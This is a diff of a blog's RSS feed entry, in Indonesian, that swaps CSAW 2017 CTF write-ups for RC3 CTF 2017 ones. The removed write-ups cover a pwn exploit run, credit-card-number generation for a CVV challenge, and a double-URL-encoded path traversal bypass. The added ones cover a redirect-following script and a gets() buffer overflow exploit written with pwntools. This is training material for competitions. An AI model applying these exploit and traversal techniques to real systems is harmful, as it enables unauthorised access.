-&lt;span style=&quot;color:#ffee80;&quot;&gt;log.info&lt;span style=&quot;color:#e1efff;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#ffee80;&quot;&gt;&lt;span style=&quot;color:#3ad900;&quot;&gt;&quot;&lt;/span&gt;Payload Length &lt;span style=&quot;color:#80ff82;&quot;&gt;%d&lt;/span&gt;&lt;span style=&quot;color:#3ad900;&quot;&gt;&quot;&lt;/span&gt; &lt;span style=&quot;color:#ff9d00;&quot;&gt;%&lt;/span&gt; (&lt;span style=&quot;color:#ffee80;&quot;&gt;&lt;span style=&quot;color:#ffb054;&quot;&gt;len&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#ffee80;&quot;&gt;payload_to_send&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;)&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
-&lt;span style=&quot;color:#ffee80;&quot;&gt;r.sendlineafter&lt;span style=&quot;color:#e1efff;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#ffee80;&quot;&gt;&lt;span style=&quot;color:#3ad900;&quot;&gt;&quot;&lt;/span&gt;Command:&lt;span style=&quot;color:#3ad900;&quot;&gt;&quot;&lt;/span&gt;,payload_to_send&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
-&lt;span style=&quot;color:#ffee80;&quot;&gt;r.interactive&lt;span style=&quot;color:#e1efff;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;curl http://13.59.6.98
+&amp;lt;meta http-equiv&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;refresh&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0; url=C.html&quot;&lt;/span&gt; /&amp;gt; &amp;lt;p hidden&amp;gt;R&amp;lt;/p&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Website tersebut akan otomatis direfresh apabila dikunjungi via Browser. Tapi terdapat bagian &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;p hidden&amp;gt;R&amp;lt;/p&amp;gt;&lt;/code&gt; yang seperti nya adalah flag nya apabila mengikuti bagian &lt;code class=&quot;highlighter-rouge&quot;&gt;url=C.html&lt;/code&gt;&lt;/p&gt;
 
-&lt;/pre&gt;
-&lt;p&gt;Exploit code dijalankan.&lt;/p&gt;
-&lt;pre style=&quot;background:#002240;color:#fff;&quot;&gt;&lt;a href=&quot;/cdn-cgi/l/email-protection&quot; class=&quot;__cf_email__&quot; data-cfemail=&quot;b6d2d3c0f6e6c1d8dfd8d1&quot;&gt;[email&amp;#160;protected]&lt;/a&gt;:&lt;span style=&quot;color:#ff9d00;&quot;&gt;~&lt;/span&gt;&lt;span style=&quot;color:#ff9d00;&quot;&gt;/&lt;/span&gt;CTF&lt;span style=&quot;color:#ff9d00;&quot;&gt;/&lt;/span&gt;CSAW2017$ python pwn_pilot.py
-&lt;span style=&quot;color:#e1efff;&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;color:#ff9d00;&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;]&lt;/span&gt; Opening connection to pwn.chal.csaw.io on port &lt;span style=&quot;color:#ff628c;&quot;&gt;8464&lt;/span&gt;: Done
-&lt;span style=&quot;color:#e1efff;&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;color:#ff9d00;&quot;&gt;*&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;]&lt;/span&gt; Payload Length &lt;span style=&quot;color:#ff628c;&quot;&gt;48&lt;/span&gt;
-&lt;span style=&quot;color:#e1efff;&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;color:#ff9d00;&quot;&gt;*&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;]&lt;/span&gt; Switching to interactive mode
-$ ls
-flag
-pilot
-$ cat flag
-flag&lt;span style=&quot;color:#e1efff;&quot;&gt;{&lt;/span&gt;&lt;span style=&quot;color:#ff628c;&quot;&gt;1&lt;/span&gt;nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys&lt;span style=&quot;color:#e1efff;&quot;&gt;}&lt;/span&gt;
-&lt;span style=&quot;color:#e1efff;&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;color:#ff9d00;&quot;&gt;*&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;]&lt;/span&gt; Got EOF &lt;span style=&quot;color:#ff9d00;&quot;&gt;while&lt;/span&gt; reading &lt;span style=&quot;color:#ff9d00;&quot;&gt;in&lt;/span&gt; interactive
+&lt;p&gt;Berikut script yang digunakan untuk melakukan automasi.&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://13.59.6.98&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;p hidden&amp;gt;(.*?)&amp;lt;/p&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;777&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Flag : {}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://13.59.6.98/{}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;url=(.*?)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Setelah menunggu beberapa saat Flag akan muncul.&lt;/p&gt;
 
-&lt;/pre&gt;
-&lt;p&gt;&lt;strong&gt;Flag : flag{1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys}&lt;/strong&gt;&lt;/p&gt;
-&lt;h1&gt;Misc (100) - CVV&lt;/h1&gt;
-&lt;pre style=&quot;background:#181818;color:#f8f8f8;&quot;&gt;CVV
-Hey fam, you got CVV? I need some CVV!
-nc misc.chal.csaw.io &lt;span style=&quot;color:#cf6a4c;&quot;&gt;8308&lt;/span&gt;
-&lt;/pre&gt;
-&lt;p&gt;Pada challenge misc CVV terdiri dari 5 stages, yang dimana setiap stage harus dilewati agar bisa mendapatkan Flag.&lt;/p&gt;
-&lt;table&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;Stage 1 : meminta input nomor kartu kredit {Visa&lt;/td&gt;
-&lt;td&gt;Discover&lt;/td&gt;
-&lt;td&gt;American Express&lt;/td&gt;
-&lt;td&gt;MasterCard}&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;p&gt;Stage 2 : meminta input nomor kartu kredit dengan 4 digit prefix&lt;/p&gt;
-&lt;p&gt;Stage 3 : meminta input nomor kartu kredit dengan 1 digit suffix&lt;/p&gt;
-&lt;p&gt;Stage 4 : meminta input nomor kartu kredit dengan 4 digit suffix&lt;/p&gt;
-&lt;p&gt;Stage 5 : meminta input apakah kartu kredit valid atau invalid.&lt;/p&gt;
-&lt;p&gt;Untuk melewati stage 1, bisa menggunakan list kartu kredit yang didapatkan di situs http://www.getcreditcardnumbers.com/&lt;/p&gt;
-&lt;p&gt;Untuk melewati stage 2-4, bisa menggunakan script &lt;a href=&quot;https://github.com/grahamking/darkcoding-credit-card/blob/master/gencc.py&quot;&gt;gencc.py&lt;/a&gt; (yang sudah saya ubah seperlu nya)&lt;/p&gt;
-&lt;p&gt;Untuk melewati stage 5, bisa menggunakan algoritma Luhn&lt;/p&gt;
-&lt;p&gt;Script yang saya gunakan bisa didapatkan disini : &lt;a href=&quot;https://github.com/rhamaa/CTF-Writeup/blob/master/CSAW2017_misc_cvv.py&quot;&gt;CSAW2017_misc_cvv.py&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Setelah dijalankan akan mendapatkan flag&lt;/p&gt;
-&lt;pre style=&quot;background:#002240;color:#fff;&quot;&gt;&lt;a href=&quot;/cdn-cgi/l/email-protection&quot; class=&quot;__cf_email__&quot; data-cfemail=&quot;ea8e8f9caaba9d8483848d&quot;&gt;[email&amp;#160;protected]&lt;/a&gt;:&lt;span style=&quot;color:#ff9d00;&quot;&gt;~&lt;/span&gt;&lt;span style=&quot;color:#ff9d00;&quot;&gt;/&lt;/span&gt;CTF&lt;span style=&quot;color:#ff9d00;&quot;&gt;/&lt;/span&gt;CSAW2017$ python CSAW2017_misc_cvv.py
-&lt;span style=&quot;color:#e1efff;&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;color:#ff9d00;&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;]&lt;/span&gt; Opening connection to misc.chal.csaw.io on port &lt;span style=&quot;color:#ff628c;&quot;&gt;8308&lt;/span&gt;: Done
-&lt;span style=&quot;color:#e1efff;&quot;&gt;[&lt;/span&gt;Send&lt;span style=&quot;color:#e1efff;&quot;&gt;]&lt;/span&gt; : &lt;span style=&quot;color:#ff628c;&quot;&gt;5323559891377255&lt;/span&gt;
-&lt;span style=&quot;color:#e1efff;&quot;&gt;[&lt;/span&gt;Send&lt;span style=&quot;color:#e1efff;&quot;&gt;]&lt;/span&gt; : &lt;span style=&quot;color:#ff628c;&quot;&gt;347542481999772&lt;/span&gt;
-&lt;span style=&quot;color:#e1efff;&quot;&gt;[&lt;/span&gt;Send&lt;span style=&quot;color:#e1efff;&quot;&gt;]&lt;/span&gt; : &lt;span style=&quot;color:#ff628c;&quot;&gt;6011857007915587&lt;/span&gt;
-.......
-Flag flag{ch3ck-exp3rian-dat3-b3for3-us3}
-&lt;/pre&gt;
-&lt;p&gt;&lt;strong&gt;Flag : flag{ch3ck-exp3rian-dat3-b3for3-us3}&lt;/strong&gt;&lt;/p&gt;
-&lt;h1&gt;Web (100) - Orange1&lt;/h1&gt;
-&lt;pre style=&quot;background:#0c1021;color:#f8f8f8;&quot;&gt;orange v1
+&lt;p&gt;Flag : &lt;code class=&quot;highlighter-rouge&quot;&gt;RC3W3MUS7G0D33P3RR3D1R3C777&lt;/code&gt;&lt;/p&gt;
 
-I wrote a little proxy program &lt;span style=&quot;color:#fbde2d;&quot;&gt;in&lt;/span&gt; NodeJS &lt;span style=&quot;color:#fbde2d;&quot;&gt;for&lt;/span&gt; my poems folder.
+&lt;h1 id=&quot;pwn-100&quot;&gt;Pwn (100)&lt;/h1&gt;
 
-Everyone wants to read flag.txt but I like it too much to share.
+&lt;p&gt;Diberikan sebuah file elf 32bit stripped bernama &lt;code class=&quot;highlighter-rouge&quot;&gt;easy_peasy&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;file easy_peasy 
+easy_peasy: ELF 32-bit LSB executable, Intel 80386, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib/ld-linux.so.2, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 2.6.24, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3a5dd5cc49b1a8efbc0a6269bdea9c1da99b3bcf, stripped
+&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;checksec easy_peasy 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'easy_peasy'&lt;/span&gt;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x8048000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 
-http:&lt;span style=&quot;color:#fbde2d;&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;color:#fbde2d;&quot;&gt;/&lt;/span&gt;web.chal.csaw.io:&lt;span style=&quot;color:#d8fa3c;&quot;&gt;7311&lt;/span&gt;&lt;span style=&quot;color:#fbde2d;&quot;&gt;/&lt;/span&gt;?path&lt;span style=&quot;color:#fbde2d;&quot;&gt;=&lt;/span&gt;orange.txt
+&lt;p&gt;Hasi decompile menggunakan &lt;code class=&quot;highlighter-rouge&quot;&gt;IDA PRO&lt;/code&gt;&lt;/p&gt;
 
-&lt;/pre&gt;
-&lt;p&gt;Saat mencoba mengakses web http://web.chal.csaw.io:7311/?path=orange.txt akan membaca file orange.txt&lt;/p&gt;
-&lt;p&gt;Apabila dilakukan &lt;em&gt;&lt;strong&gt;Path Traversing&lt;/strong&gt;&lt;/em&gt; ( ../ ) akan mengeluarkan pesan &lt;strong&gt;&lt;em&gt;WHOA THATS BANNED!!!!&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;Percobaan bypass menggunakan &lt;em&gt;&lt;strong&gt;Double Urlencoding&lt;/strong&gt;&lt;/em&gt; ternyata berhasil bisa membaca file flag.txt&lt;/p&gt;
-&lt;p&gt;../ =&amp;gt; %252E%252E%252F&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;http://web.chal.csaw.io:7311/?path=%252E%252E%252Fflag.txt&quot;&gt;http://web.chal.csaw.io:7311/?path=%252E%252E%252Fflag.txt&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Flag : flag{thank_you_based_orange_for_this_CTF_challenge}&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;Special Thanks to Allah SWT, lalu kemudian bang Abdilahrf yang udh bantu fix script CVV.&lt;/p&gt;
-&lt;p&gt;RulesOfPwning - rhama, ramdhan, bayu, Niko, Riorden, Amrul dan Agus&lt;/p&gt;
-&lt;/article&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;void __cdecl main()
+{
+  int v0; // [sp+18h] [bp-18h]@1
+  int v1; // [sp+28h] [bp-8h]@1
+  int v2; // [sp+2Ch] [bp-4h]@1
+
+  v2 = 0;
+  v1 = 0;
+  printf(&quot;Enter Key: &quot;);
+  gets((char *)&amp;amp;v0);
+  if ( v2 == 0xCAFEF00D &amp;amp;&amp;amp; v1 == 0xC0FFEE )
+    sub_80484EF();
+  puts(&quot;Error: Invalid key!&quot;);
+  srand(1u);
+  init();
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Terlihat penggunaan fungsi &lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt; yang vulnerable &lt;em&gt;Buffer Overflow&lt;/em&gt;. Dan seperti nya tujuan dari challenge ini adalah melakukan &lt;em&gt;Overwrite Local Variable&lt;/em&gt; v1 dan v2.&lt;/p&gt;
+
+&lt;p&gt;Perhitungan Padding.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;  int v0; // [sp+18h] [bp-18h]@1
+  int v1; // [sp+28h] [bp-8h]@1
+  int v2; // [sp+2Ch] [bp-4h]@1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# jumlah padding untuk overwrite v1&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt; 
+&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# jumlah padding untuk overwrite v2&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Berikut script yang digunakan&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;baby&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;18.216.183.46&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xC0FFEE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# v1&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xCAFEF00D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# v2&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;baby&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;baby&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Flag: &lt;code class=&quot;highlighter-rouge&quot;&gt;RC3-2017{S3E_N0T_TO0_B4D_HUH_ec1368b59b858e08}&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;task-files--rc3-ctf-2017http1270014000taskfilerc3-ctf-2017&quot;&gt;Task Files : &lt;a href=&quot;http://127.0.0.1:4000/task_file/RC3-CTF-2017/&quot;&gt;RC3-CTF-2017&lt;/a&gt;&lt;/h2&gt;
 </description>
         <pubDate>Mon, 20 Nov 2017 00:00:00 +0700</pubDate>
-        <link>https://rhama.my.id/ctf/2017/11/20/csawctf-2017-quals.html</link>
-        <guid isPermaLink="true">https://rhama.my.id/ctf/2017/11/20/csawctf-2017-quals.html</guid>
+        <link>https://rhama.my.id/ctf/2017/11/20/rc3-ctf-2017.html</link>
+        <guid isPermaLink="true">https://rhama.my.id/ctf/2017/11/20/rc3-ctf-2017.html</guid>
         
-        <category>CSAWCTF2017Prelims</category>
+        <category>rc3ctf</category>
         
         <category>CTF</category>
         
